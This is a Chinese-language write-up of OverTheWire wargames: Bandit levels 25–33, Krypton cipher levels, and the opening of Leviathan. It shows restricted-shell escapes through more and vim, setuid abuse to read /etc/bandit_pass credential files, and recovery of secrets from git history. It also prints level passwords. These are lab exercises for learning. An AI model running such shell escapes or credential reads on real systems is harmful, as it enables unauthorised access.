-rw-r-----  1 bandit25 bandit25   33 Apr 23 18:04 .bandit24.password
-r--------  1 bandit25 bandit25 1679 Apr 23 18:04 bandit26.sshkey
-rw-r--r--  1 root     root      220 Jan  6  2022 .bash_logout
-rw-r--r--  1 root     root     3771 Jan  6  2022 .bashrc
-rw-r-----  1 bandit25 bandit25    4 Apr 23 18:04 .pin
-rw-r--r--  1 root     root      807 Jan  6  2022 .profile
bandit25@bandit:~$ ssh -i bandit26.sshkey bandit26@localhost -p 2220
The authenticity of host '[localhost]:2220 ([127.0.0.1]:2220)' can't be established.
ED25519 key fingerprint is SHA256:C2ihUBV7ihnV1wUXRb4RrEcLfXC5CXlhmAAM/urerLY.
This key is not known by any other names
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Could not create directory '/home/bandit25/.ssh' (Permission denied).
Failed to add the host to the list of known hosts (/home/bandit25/.ssh/known_hosts).
                         _                     _ _ _
                        | |__   __ _ _ __   __| (_) |_
                        | '_ \ / _` | '_ \ / _` | | __|
                        | |_) | (_| | | | | (_| | | |_
                        |_.__/ \__,_|_| |_|\__,_|_|\__|


                      This is an OverTheWire game server.
            More information on http://www.overthewire.org/wargames

!!! You are trying to log into this SSH server with a password on port 2220 from localhost.
!!! Connecting from localhost is blocked to conserve resources.
!!! Please log out and log in again.


      ,----..            ,----,          .---.
     /   /   \         ,/   .`|         /. ./|
    /   .     :      ,`   .'  :     .--'.  ' ;
   .   /   ;.  \   ;    ;     /    /__./ \ : |
  .   ;   /  ` ; .'___,/    ,' .--'.  '   \' .
  ;   |  ; \ ; | |    :     | /___/ \ |    ' '
  |   :  | ; | ' ;    |.';  ; ;   \  \;      :
  .   |  ' ' ' : `----'  |  |  \   ;  `      |
  '   ;  \; /  |     '   :  ;   .   \    .\  ;
   \   \  ',  /      |   |  '    \   \   ' \ |
    ;   :    /       '   :  |     :   '  |--&quot;
     \   \ .'        ;   |.'       \   \ ;
  www. `---` ver     '---' he       '---&quot; ire.org


Welcome to OverTheWire!

If you find any problems, please report them to the #wargames channel on
discord or IRC.

--[ Playing the games ]--

  This machine might hold several wargames.
  If you are playing &quot;somegame&quot;, then:

    * USERNAMES are somegame0, somegame1, ...
    * Most LEVELS are stored in /somegame/.
    * PASSWORDS for each level are stored in /etc/somegame_pass/.

  Write-access to homedirectories is disabled. It is advised to create a
  working directory with a hard-to-guess name in /tmp/.  You can use the
  command &quot;mktemp -d&quot; in order to generate a random and hard to guess
  directory in /tmp/.  Read-access to both /tmp/ is disabled and to /proc
  restricted so that users cannot snoop on eachother. Files and directories
  with easily guessable or short names will be periodically deleted! The /tmp
  directory is regularly wiped.
  Please play nice:

    * don't leave orphan processes running
    * don't leave exploit-files laying around
    * don't annoy other players
    * don't post passwords or spoilers
    * again, DONT POST SPOILERS!
      This includes writeups of your solution on your blog or website!

--[ Tips ]--

  This machine has a 64bit processor and many security-features enabled
  by default, although ASLR has been switched off.  The following
  compiler flags might be interesting:

    -m32                    compile for 32bit
    -fno-stack-protector    disable ProPolice
    -Wl,-z,norelro          disable relro

  In addition, the execstack tool can be used to flag the stack as
  executable on ELF binaries.

  Finally, network-access is limited for most levels by a local
  firewall.

--[ Tools ]--

 For your convenience we have installed a few useful tools which you can find
 in the following locations:

    * gef (https://github.com/hugsy/gef) in /opt/gef/
    * pwndbg (https://github.com/pwndbg/pwndbg) in /opt/pwndbg/
    * peda (https://github.com/longld/peda.git) in /opt/peda/
    * gdbinit (https://github.com/gdbinit/Gdbinit) in /opt/gdbinit/
    * pwntools (https://github.com/Gallopsled/pwntools)
    * radare2 (http://www.radare.org/)

 Both python2 and python3 are installed.

--[ More information ]--

  For more information regarding individual wargames, visit
  http://www.overthewire.org/wargames/

  For support, questions or comments, contact us on discord or IRC.

  Enjoy your stay!

  _                     _ _ _   ___   __
 | |                   | (_) | |__ \ / /
 | |__   __ _ _ __   __| |_| |_   ) / /_
 | '_ \ / _` | '_ \ / _` | | __| / / '_ \
 | |_) | (_| | | | | (_| | | |_ / /| (_) |
 |_.__/ \__,_|_| |_|\__,_|_|\__|____\___/
Connection to localhost closed.
bandit25@bandit:~$
</code></pre>
<p>这一步需要知道etc/passwd的内容，这里有个<a href="https://blog.csdn.net/dearsq/article/details/52586320">中文博客</a></p>
<pre><code>bandit25@bandit:~$ cat /etc/passwd | grep &quot;bandit26&quot;
bandit26:x:11026:11026:bandit level 26:/home/bandit26:/usr/bin/showtext
bandit25@bandit:~$ cat /usr/bin/showtext
#!/bin/sh

export TERM=linux

exec more ~/text.txt
exit 0
bandit25@bandit:~$
</code></pre>
<p>发现使用more展示，这里就可以把窗口缩小，让他一下子展示不完需要翻页即可，然后进入vim模式就可以进行搜索啊、编辑啊之类的事了，就解决了。</p>
<pre><code>:r /etc/bandit_pass/bandit26
c7GvcKlw9mC7aUQaPx7nwFstuAIBw1o1
</code></pre>
<h1 id="level27-2"><a class="header" href="#level27-2">level27</a></h1>
<p>这一题和level26一样，还得缩小terminal，这个不会，看的网上的题解。</p>
<pre><code>:set shell sh=/bin/sh
:sh
$ ll
/bin/sh: 1: ll: not found
$ ls -al
total 44
drwxr-xr-x  3 root     root      4096 Apr 23 18:04 .
drwxr-xr-x 70 root     root      4096 Apr 23 18:05 ..
-rw-r--r--  1 root     root       220 Jan  6  2022 .bash_logout
-rw-r--r--  1 root     root      3771 Jan  6  2022 .bashrc
-rw-r--r--  1 root     root       807 Jan  6  2022 .profile
drwxr-xr-x  2 root     root      4096 Apr 23 18:04 .ssh
-rwsr-x---  1 bandit27 bandit26 14876 Apr 23 18:04 bandit27-do
-rw-r-----  1 bandit26 bandit26   258 Apr 23 18:04 text.txt
$ file bandit27-do
bandit27-do: setuid ELF 32-bit LSB executable, Intel 80386, version 1 (SYSV), dynamically linked, interpreter /lib/ld-linux.so.2, BuildID[sha1]=c148b21f7eb7e816998f07490c8007567e51953f, for GNU/Linux 3.2.0, not stripped
$ ./bandit27-do
Run a command as another user.
  Example: ./bandit27-do id
$ ./bandit27-do cat /etc/bandit_pass/bandit27
YnQpBuifNMas1hcUFk70ZmqkhUU2EuaS
</code></pre>
<h1 id="level28-2"><a class="header" href="#level28-2">level28</a></h1>
<p>使用git仓库</p>
<pre><code>bandit27@bandit:/tmp/a$ git clone ssh://bandit27-git@localhost:2220/home/bandit27-git/repo
Cloning into 'repo'...
The authenticity of host '[localhost]:2220 ([127.0.0.1]:2220)' can't be established.
ED25519 key fingerprint is SHA256:C2ihUBV7ihnV1wUXRb4RrEcLfXC5CXlhmAAM/urerLY.
This key is not known by any other names
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Could not create directory '/home/bandit27/.ssh' (Permission denied).
Failed to add the host to the list of known hosts (/home/bandit27/.ssh/known_hosts).
                         _                     _ _ _
                        | |__   __ _ _ __   __| (_) |_
                        | '_ \ / _` | '_ \ / _` | | __|
                        | |_) | (_| | | | | (_| | | |_
                        |_.__/ \__,_|_| |_|\__,_|_|\__|


                      This is an OverTheWire game server.
            More information on http://www.overthewire.org/wargames

bandit27-git@localhost's password:
remote: Enumerating objects: 3, done.
remote: Counting objects: 100% (3/3), done.
remote: Compressing objects: 100% (2/2), done.
remote: Total 3 (delta 0), reused 0 (delta 0), pack-reused 0
Receiving objects: 100% (3/3), done.
bandit27@bandit:/tmp/a$ ll
total 10564
drwxrwxr-x   3 bandit27 bandit27     4096 Jul 19 02:08 ./
drwxrwx-wt 317 root     root     10801152 Jul 19 02:08 ../
drwxrwxr-x   3 bandit27 bandit27     4096 Jul 19 02:08 repo/
bandit27@bandit:/tmp/a$ cd repo/
bandit27@bandit:/tmp/a/repo$ ll
total 16
drwxrwxr-x 3 bandit27 bandit27 4096 Jul 19 02:08 ./
drwxrwxr-x 3 bandit27 bandit27 4096 Jul 19 02:08 ../
drwxrwxr-x 8 bandit27 bandit27 4096 Jul 19 02:08 .git/
-rw-rw-r-- 1 bandit27 bandit27   68 Jul 19 02:08 README
bandit27@bandit:/tmp/a/repo$ cat README
The password to the next level is: AVanL161y9rsbcJIsFHuw35rjaOM19nR
bandit27@bandit:/tmp/a/repo$
</code></pre>
<h1 id="level29-2"><a class="header" href="#level29-2">level29</a></h1>
<p>还是老规矩</p>
<pre><code>bandit28@bandit:/tmp/b$ git clone ssh://bandit28-git@localhost:2220/home/bandit28-git/repo
Cloning into 'repo'...
The authenticity of host '[localhost]:2220 ([127.0.0.1]:2220)' can't be established.
ED25519 key fingerprint is SHA256:C2ihUBV7ihnV1wUXRb4RrEcLfXC5CXlhmAAM/urerLY.
This key is not known by any other names
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Could not create directory '/home/bandit28/.ssh' (Permission denied).
Failed to add the host to the list of known hosts (/home/bandit28/.ssh/known_hosts).
                         _                     _ _ _
                        | |__   __ _ _ __   __| (_) |_
                        | '_ \ / _` | '_ \ / _` | | __|
                        | |_) | (_| | | | | (_| | | |_
                        |_.__/ \__,_|_| |_|\__,_|_|\__|


                      This is an OverTheWire game server.
            More information on http://www.overthewire.org/wargames

bandit28-git@localhost's password:
remote: Enumerating objects: 9, done.
remote: Counting objects: 100% (9/9), done.
remote: Compressing objects: 100% (6/6), done.
remote: Total 9 (delta 2), reused 0 (delta 0), pack-reused 0
Receiving objects: 100% (9/9), done.
Resolving deltas: 100% (2/2), done.
bandit28@bandit:/tmp/b$ cd repo/
bandit28@bandit:/tmp/b/repo$ ll
total 16
drwxrwxr-x 3 bandit28 bandit28 4096 Jul 19 02:11 ./
drwxrwxr-x 3 bandit28 bandit28 4096 Jul 19 02:11 ../
drwxrwxr-x 8 bandit28 bandit28 4096 Jul 19 02:11 .git/
-rw-rw-r-- 1 bandit28 bandit28  111 Jul 19 02:11 README.md
bandit28@bandit:/tmp/b/repo$ cat README.md
# Bandit Notes
Some notes for level29 of bandit.

## credentials

- username: bandit29
- password: xxxxxxxxxx

bandit28@bandit:/tmp/b/repo$ git log
commit 899ba88df296331cc01f30d022c006775d467f28 (HEAD -&gt; master, origin/master, origin/HEAD)
Author: Morla Porla &lt;morla@overthewire.org&gt;
Date:   Sun Apr 23 18:04:39 2023 +0000

    fix info leak

commit abcff758fa6343a0d002a1c0add1ad8c71b88534
Author: Morla Porla &lt;morla@overthewire.org&gt;
Date:   Sun Apr 23 18:04:39 2023 +0000

    add missing data

commit c0a8c3cf093fba65f4ee0e1fe2a530b799508c78
Author: Ben Dover &lt;noone@overthewire.org&gt;
Date:   Sun Apr 23 18:04:39 2023 +0000

    initial commit of README.md
</code></pre>
<p><strong>这是典型的git泄露</strong></p>
<pre><code>bandit28@bandit:/tmp/b/repo$ git diff 899b abcf
diff --git a/README.md b/README.md
index 5c6457b..b302105 100644
--- a/README.md
+++ b/README.md
@@ -4,5 +4,5 @@ Some notes for level29 of bandit.
 ## credentials

 - username: bandit29
-- password: xxxxxxxxxx
+- password: tQKvmcwNYcFS6vmPHIUSI3ShmsrQZK8S

bandit28@bandit:/tmp/b/repo$
</code></pre>
<h1 id="level30-2"><a class="header" href="#level30-2">level30</a></h1>
<p>下载下来以后，一开始以为是stash，然后发现不是，那么查看别的分支。</p>
<pre><code>bandit29@bandit:/tmp/c/repo$ git stash list
bandit29@bandit:/tmp/c/repo$ git branch  -a
* master
  remotes/origin/HEAD -&gt; origin/master
  remotes/origin/dev
  remotes/origin/master
  remotes/origin/sploits-dev
bandit29@bandit:/tmp/c/repo$
</code></pre>
<p>然后切换分支即可</p>
<pre><code>bandit29@bandit:/tmp/c/repo$ git checkout dev
Branch 'dev' set up to track remote branch 'dev' from 'origin'.
Switched to a new branch 'dev'
bandit29@bandit:/tmp/c/repo$ cat README.md
# Bandit Notes
Some notes for bandit30 of bandit.

## credentials

- username: bandit30
- password: xbhV3HpNGlTIdnjUrdAlPzc2L6y9EOnS

bandit29@bandit:/tmp/c/repo$
</code></pre>
<h1 id="level31-2"><a class="header" href="#level31-2">level31</a></h1>
<p>这个不会，看了一下网上的答案，这玩意儿叫引用，这里是<a href="https://git-scm.com/docs/git-show-ref">Git Pro教程</a></p>
<pre><code>bandit30@bandit:/tmp/d/repo$ git show-ref
59530d30d299ff2e3e9719c096ebf46a65cc1424 refs/heads/master
59530d30d299ff2e3e9719c096ebf46a65cc1424 refs/remotes/origin/HEAD
59530d30d299ff2e3e9719c096ebf46a65cc1424 refs/remotes/origin/master
831aac2e2341f009e40e46392a4f5dd318483019 refs/tags/secret
bandit30@bandit:/tmp/d/repo$ git show 831a
OoffzGDlzhAlerFJ2cAiz1D41JW1Mhmt
bandit30@bandit:/tmp/d/repo$
</code></pre>
<h1 id="level32-2"><a class="header" href="#level32-2">level32</a></h1>
<p>push文件</p>
<pre><code>bandit31@bandit:/tmp/d/repo$ git add -f ./key.txt
bandit31@bandit:/tmp/d/repo$ git commit -m &quot;add key.txt&quot;
[master 462b8a5] add key.txt
 1 file changed, 1 insertion(+)
 create mode 100644 key.txt
bandit31@bandit:/tmp/d/repo$ git push
The authenticity of host '[localhost]:2220 ([127.0.0.1]:2220)' can't be established.
ED25519 key fingerprint is SHA256:C2ihUBV7ihnV1wUXRb4RrEcLfXC5CXlhmAAM/urerLY.
This key is not known by any other names
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Could not create directory '/home/bandit31/.ssh' (Permission denied).
Failed to add the host to the list of known hosts (/home/bandit31/.ssh/known_hosts).
                         _                     _ _ _
                        | |__   __ _ _ __   __| (_) |_
                        | '_ \ / _` | '_ \ / _` | | __|
                        | |_) | (_| | | | | (_| | | |_
                        |_.__/ \__,_|_| |_|\__,_|_|\__|


                      This is an OverTheWire game server.
            More information on http://www.overthewire.org/wargames

bandit31-git@localhost's password:
Enumerating objects: 4, done.
Counting objects: 100% (4/4), done.
Delta compression using up to 2 threads
Compressing objects: 100% (2/2), done.
Writing objects: 100% (3/3), 324 bytes | 324.00 KiB/s, done.
Total 3 (delta 0), reused 0 (delta 0), pack-reused 0
remote: ### Attempting to validate files... ####
remote:
remote: .oOo.oOo.oOo.oOo.oOo.oOo.oOo.oOo.oOo.oOo.
remote:
remote: Well done! Here is the password for the next level:
remote: rmCBvG56y58BXzv98yZGdO7ATVL5dW8y
remote:
remote: .oOo.oOo.oOo.oOo.oOo.oOo.oOo.oOo.oOo.oOo.
remote:
To ssh://localhost:2220/home/bandit31-git/repo
 ! [remote rejected] master -&gt; master (pre-receive hook declined)
error: failed to push some refs to 'ssh://localhost:2220/home/bandit31-git/repo'
bandit31@bandit:/tmp/d/repo$
</code></pre>
<h1 id="level33-2"><a class="header" href="#level33-2">level33</a></h1>
<p>这个不会，看的<a href="https://mayadevbe.me/posts/overthewire/bandit/level33/">答案</a></p>
<pre><code>&gt;&gt; $0
$ cat /etc/bandit_pass/bandit33
odHo63fHiFqcWWJG9rLiLDtPm45KzUKy
</code></pre>
<h1 id="彩蛋了"><a class="header" href="#彩蛋了">彩蛋了</a></h1>
<pre><code>bandit33@bandit:~$ cat README.txt
Congratulations on solving the last level of this game!

At this moment, there are no more levels to play in this game. However, we are constantly working
on new levels and will most likely expand this game with more levels soon.
Keep an eye out for an announcement on our usual communication channels!
In the meantime, you could play some of our other wargames.

If you have an idea for an awesome new level, please let us know!
bandit33@bandit:~$
</code></pre>
<p><strong>完结撒花</strong></p>
<div style="break-before: page; page-break-before: always;"></div><h1 id="level0"><a class="header" href="#level0">level0</a></h1>
<p>base64解码</p>
<pre><code>S1JZUFRPTklTR1JFQVQ=
 |
 |
\|/
KRYPTONISGREAT
</code></pre>
<h1 id="level1-4"><a class="header" href="#level1-4">level1</a></h1>
<p>差点儿没找着文件，真抽象。</p>
<pre><code>krypton1@bandit:/krypton/krypton1$ ll
total 16
drwxr-xr-x 2 root     root     4096 Apr 23 18:05 ./
drwxr-xr-x 8 root     root     4096 Apr 23 18:05 ../
-rw-r----- 1 krypton1 krypton1   26 Apr 23 18:05 krypton2
-rw-r----- 1 krypton1 krypton1  882 Apr 23 18:05 README
krypton1@bandit:/krypton/krypton1$ cat README
Welcome to Krypton!

This game is intended to give hands on experience with cryptography
and cryptanalysis.  The levels progress from classic ciphers, to modern,
easy to harder.

Although there are excellent public tools, like cryptool,to perform
the simple analysis, we strongly encourage you to try and do these
without them for now.  We will use them in later excercises.

** Please try these levels without cryptool first **


The first level is easy.  The password for level 2 is in the file
'krypton2'.  It is 'encrypted' using a simple rotation called ROT13.
It is also in non-standard ciphertext format.  When using alpha characters for
cipher text it is normal to group the letters into 5 letter clusters,
regardless of word boundaries.  This helps obfuscate any patterns.

This file has kept the plain text word boundaries and carried them to
the cipher text.

Enjoy!

krypton1@bandit:/krypton/krypton1$ cat krypton2 | tr [A-Z] [N-ZA-M]
LEVEL TWO PASSWORD ROTTEN
krypton1@bandit:/krypton/krypton1$
</code></pre>
<p>就一个移位密码</p>
<h1 id="level2-4"><a class="header" href="#level2-4">level2</a></h1>
<p>还是一个移位密码</p>
<pre><code>krypton2@bandit:/tmp/krypton2$ cat /etc/issue
Ubuntu 22.04.2 LTS \n \l

krypton2@bandit:/tmp/krypton2$ /krypton/krypton2/encrypt /etc/issue
krypton2@bandit:/tmp/krypton2$ cat ciphertext
GNGZFGXFEZXkrypton2@bandit:/tmp/krypton2$
</code></pre>
<p>因此</p>
<pre><code>krypton2@bandit:/tmp/krypton2$ cat /krypton/krypton2/krypton3 | tr [A-Z] [O-ZA-N]
CAESARISEASY
krypton2@bandit:/tmp/krypton2$
</code></pre>
<h1 id="level3-3"><a class="header" href="#level3-3">level3</a></h1>
<p>提示是统计，那就知道了</p>
<pre><code>krypton3@bandit:/krypton/krypton3$ cat found{1..3} | tr -cd '[:alpha:]' | fold -w1 | sort | uniq -c | sort -nr
    456 S
    340 Q
    301 J
    257 U
    246 B
    240 N
    227 G
    227 C
    210 D
    132 Z
    130 V
    129 W
     86 M
     84 Y
     75 T
     71 X
     67 K
     64 E
     60 L
     55 A
     28 F
     19 I
     12 O
      4 R
      4 H
      2 P
</code></pre>
<p><img src="WarGame/image-11.png" alt="alpha" />
然后这儿有个这玩意，大概能看出来</p>
<p>但是不完全准，来回试试基本上就可以了</p>
<pre><code>krypton3@bandit:/krypton/krypton3$ cat krypton4 | tr 'KSVWBDGIXMNYQUCAJ' 'WELDOHNVFURPASIBT'
WELLD ONETH ELELE LFOUP RASSW OPDIS XPUTE krypton3@bandit:/krypton/krypton3$
</code></pre>
<p>比如说你猜krypton里面有password，然后猜一下就行。</p>
<h1 id="level4-3"><a class="header" href="#level4-3">level4</a></h1>
<p>直接看wp了反正是。。。</p>
<pre><code>cleartext
</code></pre>
<p>这里有个破解这种密码的<a href="https://zhuanlan.zhihu.com/p/111611977">中文参考</a>，可以看一看</p>
<h1 id="level5-3"><a class="header" href="#level5-3">level5</a></h1>
<p>这回，搜了个脚本儿。。。</p>
<p>自己写是真不会。。。</p>
<p>当然，首先需要一点点小的命令</p>
<pre><code>cat /krypton/krypton5/found{1..3} | tr -d '[:space:]' &gt; output.txt
</code></pre>
<p>然后跑脚本</p>
<p><a href="https://www.jianshu.com/p/23e3dcb3f0e9">ref1</a>
<a href="https://blog.csdn.net/qq_51927659/article/details/116951315">REF2</a></p>
<pre><code>import string

# 加载密文
with open('output.txt', 'r') as f:
    cipher = f.read()

#coding=utf-8
#-*- coding:utf-8 –*-
def c_alpha(cipher):   # 去掉非字母后的密文
    cipher_alpha = ''
    for i in range(len(cipher)):
        if (cipher[i].isalpha()):
            cipher_alpha += cipher[i]
    return cipher_alpha

# 计算cipher的重合指数
def count_CI(cipher):
    N = [0.0 for i in range(26)]
    cipher = c_alpha(cipher)
    L = len(cipher)
    if cipher == '':
        return 0
    else:
        for i in range(L):     #计算所有字母的频数，存在数组N当中
            if (cipher[i].islower()):
                 N[ord(cipher[i]) - ord('a')] += 1
            else:
                 N[ord(cipher[i]) - ord('A')] += 1
    CI_1 = 0
    for i in range(26):
        CI_1 += ((N[i] / L) * ((N[i]-1) / (L-1)))
    return CI_1

# 计算秘钥长度为 key_len 的重合指数
def count_key_len_CI(cipher,key_len):
    un_cip = ['' for i in range(key_len)]    # un_cip 是分组
    aver_CI = 0.0
    count = 0
    for i in range(len(cipher_alpha)):
        z = i % key_len
        un_cip[z] += cipher_alpha[i]
    for i in range(key_len):
        un_cip[i]= count_CI(un_cip[i])
        aver_CI += un_cip[i]
    aver_CI = aver_CI/len(un_cip)
    return aver_CI

## 找出最可能的前十个秘钥长度
def pre_10(cipher):
    M = [(1,count_CI(cipher))]+[(0,0.0) for i in range(49)]
    for i in range(2,50):
        M[i] = (i,abs(0.065 - count_key_len_CI(cipher,i)))
    M = sorted(M,key = lambda x:x[1])   #按照数组第二个元素排序
    for i in range(1,10):
        print (M[i])

F = [
0.0651738, 0.0124248, 0.0217339,
0.0349835, 0.1041442, 0.0197881,
0.0158610, 0.0492888, 0.0558094,
0.0009033, 0.0050529, 0.0331490,
0.0202124, 0.0564513, 0.0596302,
0.0137645, 0.0008606, 0.0497563,
0.0515760, 0.0729357, 0.0225134,
0.0082903, 0.0171272, 0.0013692,
0.0145984, 0.0007836
]       # 英文字符频率。

cipher_alpha = c_alpha(cipher)
print (&quot;秘钥长度为:&quot;)
pre_10(cipher)

</code></pre>
<p>然后有如下输出：</p>
<pre><code>krypton5@bandit:/tmp/krypton5$ python3 test.py
秘钥长度为:
(9, 0.017139818147855056)
(36, 0.017203685000228598)
(18, 0.01721992202177322)
(27, 0.017472532653033286)
(45, 0.0176209079041227)
(33, 0.020346335439459143)
(48, 0.020422875620895405)
(24, 0.020464673333004946)
(30, 0.02051347672724485)
</code></pre>
<p>这个也看了一下wp，九位密码是准的，但是程序输出的密钥不准，不知为什么。</p>
<p>密钥是 keylength, 答案是 RANDOM</p>
<h1 id="level6-3"><a class="header" href="#level6-3">level6</a></h1>
<p>这个还是那个维吉尼亚的变形，没有太难。</p>
<pre><code>ciphertext = 'PNUKLYLWRQKGKBE'
key = 'EICTDGYIYZKTHNSIRFXYCPFUEOCKRN'

for c, k in zip(ciphertext, key):
    p = ord('A') + ((ord(c) - ord(k)) % 26)
    print(chr(p), end='')

print()
</code></pre>
<p>最后密码如下</p>
<pre><code>LFSRISNOTRANDOM
</code></pre>
<h1 id="ref-6"><a class="header" href="#ref-6">ref</a></h1>
<p>这些东西感觉知道原理就差不多了，自己写实在是没意思而且有些困难。</p>
<p>也有不少人写脚本分析，但是感觉那些脚本分析出来的也不是很准，还是需要人工来看，反正有兴趣的可以搜搜。</p>
<p>去网上看了看发现别人也是用工具，自己分析真是过于无聊了。
<a href="https://bijjybox.medium.com/krypton-6e24bca1c06c">ref3</a></p>
<div style="break-before: page; page-break-before: always;"></div><h1 id="level0-1"><a class="header" href="#level0-1">level0</a></h1>
<p>ssh登录，老三样了</p>
<pre><code>┌─🌵[myc@ubuntu22]─[~]
└──╼[11:00:33]$ ssh leviathan0@leviathan.labs.overthewire.org -p 2223
The authenticity of host '[leviathan.labs.overthewire.org]:2223 ([16.16.148.221]:2223)' can't be established.
ED25519 key fingerprint is SHA256:C2ihUBV7ihnV1wUXRb4RrEcLfXC5CXlhmAAM/urerLY.
This host key is known by the following other names/addresses:
    ~/.ssh/known_hosts:6: [hashed name]
    ~/.ssh/known_hosts:9: [hashed name]
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '[leviathan.labs.overthewire.org]:2223' (ED25519) to the list of known hosts.
                   _            _       _   _
                  | | _____   _(_) __ _| |_| |__   __ _ _ __
                  | |/ _ \ \ / / |/ _` | __| '_ \ / _` | '_ \
                  | |  __/\ V /| | (_| | |_| | | | (_| | | | |
                  |_|\___| \_/ |_|\__,_|\__|_| |_|\__,_|_| |_|


                      This is an OverTheWire game server.
            More information on http://www.overthewire.org/wargames

leviathan0@leviathan.labs.overthewire.org's password:

      ,----..            ,----,          .---.
     /   /   \         ,/   .`|         /. ./|
    /   .     :      ,`   .'  :     .--'.  ' ;
   .   /   ;.  \   ;    ;     /    /__./ \ : |
  .   ;   /  ` ; .'___,/    ,' .--'.  '   \' .
  ;   |  ; \ ; | |    :     | /___/ \ |    ' '
  |   :  | ; | ' ;    |.';  ; ;   \  \;      :
  .   |  ' ' ' : `----'  |  |  \   ;  `      |
  '   ;  \; /  |     '   :  ;   .   \    .\  ;
   \   \  ',  /      |   |  '    \   \   ' \ |
    ;   :    /       '   :  |     :   '  |--&quot;
     \   \ .'        ;   |.'       \   \ ;
  www. `---` ver     '---' he       '---&quot; ire.org


Welcome to OverTheWire!

If you find any problems, please report them to the #wargames channel on
discord or IRC.

--[ Playing the games ]--

  This machine might hold several wargames.
  If you are playing &quot;somegame&quot;, then:

    * USERNAMES are somegame0, somegame1, ...
    * Most LEVELS are stored in /somegame/.
    * PASSWORDS for each level are stored in /etc/somegame_pass/.

  Write-access to homedirectories is disabled. It is advised to create a
  working directory with a hard-to-guess name in /tmp/.  You can use the
  command &quot;mktemp -d&quot; in order to generate a random and hard to guess
  directory in /tmp/.  Read-access to both /tmp/ is disabled and to /proc
  restricted so that users cannot snoop on eachother. Files and directories
  with easily guessable or short names will be periodically deleted! The /tmp
  directory is regularly wiped.
  Please play nice:

    * don't leave orphan processes running
    * don't leave exploit-files laying around
    * don't annoy other players
    * don't post passwords or spoilers
    * again, DONT POST SPOILERS!
      This includes writeups of your solution on your blog or website!

--[ Tips ]--

  This machine has a 64bit processor and many security-features enabled
  by default, although ASLR has been switched off.  The following
  compiler flags might be interesting:

    -m32                    compile for 32bit
    -fno-stack-protector    disable ProPolice
    -Wl,-z,norelro          disable relro

  In addition, the execstack tool can be used to flag the stack as
  executable on ELF binaries.

  Finally, network-access is limited for most levels by a local
  firewall.

--[ Tools ]--

 For your convenience we have installed a few useful tools which you can find
 in the following locations:

    * gef (https://github.com/hugsy/gef) in /opt/gef/
    * pwndbg (https://github.com/pwndbg/pwndbg) in /opt/pwndbg/
    * peda (https://github.com/longld/peda.git) in /opt/peda/
    * gdbinit (https://github.com/gdbinit/Gdbinit) in /opt/gdbinit/
    * pwntools (https://github.com/Gallopsled/pwntools)
    * radare2 (http://www.radare.org/)

 Both python2 and python3 are installed.

--[ More information ]--

  For more information regarding individual wargames, visit
  http://www.overthewire.org/wargames/

  For support, questions or comments, contact us on discord or IRC.

  Enjoy your stay!

leviathan0@gibson:~$
</code></pre>
<h1 id="level1-5"><a class="header" href="#level1-5">level1</a></h1>
<p>先看一眼存密码的地方</p>
<pre><code>total 48
drwxr-xr-x   2 root       root        4096 Apr 23 18:04 ./
drwxr-xr-x 111 root       root       12288 Apr 23 18:06 ../
-r--------   1 leviathan0 leviathan0    11 Apr 23 18:04 leviathan0
-r--------   1 leviathan1 leviathan1    11 Apr 23 18:04 leviathan1
-r--------   1 leviathan2 leviathan2    11 Apr 23 18:04 leviathan2
-r--------   1 leviathan3 leviathan3    11 Apr 23 18:04 leviathan3
-r--------   1 leviathan4 leviathan4    11 Apr 23 18:04 leviathan4
-r--------   1 leviathan5 leviathan5    11 Apr 23 18:04 leviathan5
-r--------   1 leviathan6 leviathan6    11 Apr 23 18:04 leviathan6
-r--------   1 leviathan7 leviathan7    11 Apr 23 18:04 leviathan7
leviathan0@gibson:~$
</code></pre>
<p>这挑战啥也不写，全靠脑洞啊。。。</p>
<pre><code>leviathan0@gibson:~$ ll
total 24
drwxr-xr-x  3 root       root       4096 Apr 23 18:04 ./
drwxr-xr-x 83 root       root       4096 Apr 23 18:06 ../
drwxr-x---  2 leviathan1 leviathan0 4096 Apr 23 18:04 .backup/
-rw-r--r--  1 root       root        220 Jan  6  2022 .bash_logout
-rw-r--r--  1 root       root       3771 Jan  6  2022 .bashrc
-rw-r--r--  1 root       root        807 Jan  6  2022 .profile
leviathan0@gibson:~$ ll .backup
total 140
drwxr-x--- 2 leviathan1 leviathan0   4096 Apr 23 18:04 ./
drwxr-xr-x 3 root       root         4096 Apr 23 18:04 ../
-rw-r----- 1 leviathan1 leviathan0 133259 Apr 23 18:04 bookmarks.html
leviathan0@gibson:~$ cat .backup/bookmarks.html | grep &quot;pass&quot;
&lt;DT&gt;&lt;A HREF=&quot;http://leviathan.labs.overthewire.org/passwordus.html | This will be fixed later, the password for leviathan1 is PPIfmI1qsA&quot; ADD_DATE=&quot;1155384634&quot; LAST_CHARSET=&quot;ISO-8859-1&quot; ID=&quot;rdf:#$2wIU71&quot;&gt;password to leviathan1&lt;/A&gt;
leviathan0@gibson:~$
</code></pre>
<p>反正进去以后看了看home，找到了</p>
<h1 id="level2-5"><a class="header" href="#level2-5">level2</a></h1>
<p>先看一下文件</p>
<pre><code>leviathan1@gibson:~$ file check
check: setuid ELF 32-bit LSB executable, Intel 80386, version 1 (SYSV), dynamically linked, interpreter /lib/ld-linux.so.2, BuildID[sha1]=aab009a1eb3940df51c668d1c35dc9cdc1191805, for GNU/Linux 3.2.0, not stripped
</code></pre>
<p>说明如下：</p>
<ul>
<li><code>setuid</code>：表示该可执行文件被设置了 SetUID 属性，即在执行该文件时，会使用该文件的所有者的权限来执行，而不是当前用户的权限。</li>
<li><code>ELF</code>：表示该可执行文件使用 ELF 文件格式。</li>
<li><code>32-bit</code>：表示该可执行文件是 32 位的。</li>
<li><code>LSB</code>：表示该可执行文件遵循 LSB（Linux Standard Base）规范。</li>
<li><code>Intel 80386</code>：表示该可执行文件是为 Intel 80386 架构编译的。</li>
<li><code>version 1 (SYSV)</code>：表示该可执行文件使用 SYSV 版本 1 ABI 标准。</li>
<li><code>dynamically linked</code>：表示该可执行文件使用动态链接库。</li>
<li><code>interpreter /lib/ld-linux.so.2</code>：表示该可执行文件使用 <code>/lib/ld-linux.so.2</code> 作为动态链接库的解释器。</li>
<li><code>BuildID[sha1]=aab009a1eb3940df51c668d1c35dc9cdc1191805</code>：表示该可执行文件的构建 ID。</li>
